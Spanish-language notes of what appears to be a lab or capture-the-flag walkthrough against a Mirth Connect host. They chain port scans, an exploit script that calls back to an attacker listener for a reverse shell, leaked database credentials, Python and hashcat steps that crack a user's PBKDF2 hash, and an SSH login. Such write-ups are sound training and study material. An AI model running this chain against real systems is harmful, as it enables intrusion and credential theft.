

```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.3.105 -oG allPorts
```

```shell
[*] IP Address: 10.129.3.105
[*] Open ports: 22,80,443,6661
```

```shell
nmap -p22,80,443,6661 -sCV 10.129.3.105 -oN targeted
```

Navegamos al puerto `80`

```shell
python3 test.py -u https://10.129.3.105/ -lh 10.10.15.92 -lp 4444
```

```shell
database.username = mirthdb
database.password = MirthPass123!
```

encontramos un usuario
```ad-hint
sedric::u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

El hash parece base64
```shell
python3 -c "
import base64
data = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
salt = base64.b64encode(data[:8]).decode()
hash = base64.b64encode(data[8:]).decode()
print(f'sha256:600000:{salt}:{hash}')
"
```

Para sacar el hash y poder crackearlo
```shell
hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt
```

Obtenienco como contraseña
```shell
snowflake1
```

Pudiendonos conectar ahora por ssh
```shell
ssh sedric@10.129.3.105  
```

